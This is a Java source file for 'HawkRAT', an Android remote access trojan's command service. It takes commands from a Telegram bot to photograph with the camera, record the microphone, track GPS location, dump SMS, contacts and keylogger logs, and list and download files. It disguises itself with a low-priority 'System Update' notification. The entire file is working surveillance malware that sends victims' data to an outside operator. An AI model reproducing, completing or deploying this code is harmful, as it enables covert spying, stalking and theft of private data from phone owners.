package com.hawk.rat;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import org.json.JSONArray;
import org.json.JSONObject;
public class TelegramService extends Service {
    private volatile boolean running = true;
    private long lastOffset = 0;
    private Thread pollThread;
    @Override public void onCreate() { super.onCreate(); startForeground(1, buildNotification()); }
    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (pollThread == null || !pollThread.isAlive()) {
            pollThread = new Thread(this::pollLoop);
            pollThread.start();
            BotApi.sendMessage(this, "✅ HawkRAT online\nDevice: " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE + "\nSend /help");
        }
        return START_STICKY;
    }
    private void pollLoop() {
        while (running) {
            try {
                JSONObject res = BotApi.getUpdates(this, lastOffset);
                if (res.optBoolean("ok")) {
                    JSONArray updates = res.optJSONArray("result");
                    if (updates != null) {
                        for (int i = 0; i < updates.length(); i++) {
                            JSONObject u = updates.getJSONObject(i);
                            lastOffset = u.getLong("update_id") + 1;
                            handleUpdate(u);
                        }
                    }
                }
            } catch (Exception e) { try { Thread.sleep(3000); } catch (InterruptedException ignored) {} }
        }
    }
    private void handleUpdate(JSONObject u) {
        try {
            JSONObject msg = u.optJSONObject("message");
            if (msg == null) return;
            String text = msg.optString("text", "").trim();
            if (text.isEmpty()) return;
            if (text.equals("/start") || text.equals("/help")) BotApi.sendMessage(this, "Commands:\n/cam\n/mic\n/loc\n/sms\n/contacts\n/files\n/get\n/keys\n/stop");
            else if (text.equals("/cam")) new CmdCamera(this).run();
            else if (text.startsWith("/mic")) { int s = 10; String[] p = text.split(" "); if (p.length > 1) try { s = Integer.parseInt(p[1]); } catch (Exception ignored) {} new CmdMic(this).record(s); }
            else if (text.equals("/loc")) new CmdGps(this).run();
            else if (text.equals("/sms")) new CmdSms(this).run();
            else if (text.equals("/contacts")) new CmdContacts(this).run();
            else if (text.startsWith("/files")) { String path = "/sdcard"; String[] p = text.split(" ", 2); if (p.length > 1) path = p[1]; new CmdFiles(this).list(path); }
            else if (text.startsWith("/get")) { String[] p = text.split(" ", 2); if (p.length > 1) new CmdFiles(this).download(p[1]); }
            else if (text.equals("/keys")) BotApi.sendMessage(this, KeyloggerService.dumpLog());
            else if (text.equals("/stop")) { running = false; BotApi.sendMessage(this, "Stopping"); stopSelf(); }
            else BotApi.sendMessage(this, "Unknown: " + text);
        } catch (Exception e) { BotApi.sendMessage(this, "err: " + e.getMessage()); }
    }
    private Notification buildNotification() {
        String chId = "hawk_svc";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(new NotificationChannel(chId, "System Update", NotificationManager.IMPORTANCE_MIN));
            return new Notification.Builder(this, chId).setContentTitle("System Update").setContentText("Checking...").setSmallIcon(android.R.drawable.stat_notify_sync).build();
        } else {
            return new Notification.Builder(this).setContentTitle("System Update").setContentText("Checking...").setSmallIcon(android.R.drawable.stat_notify_sync).build();
        }
    }
    @Override public void onDestroy() { running = false; super.onDestroy(); }
    @Override public IBinder onBind(Intent intent) { return null; }
}
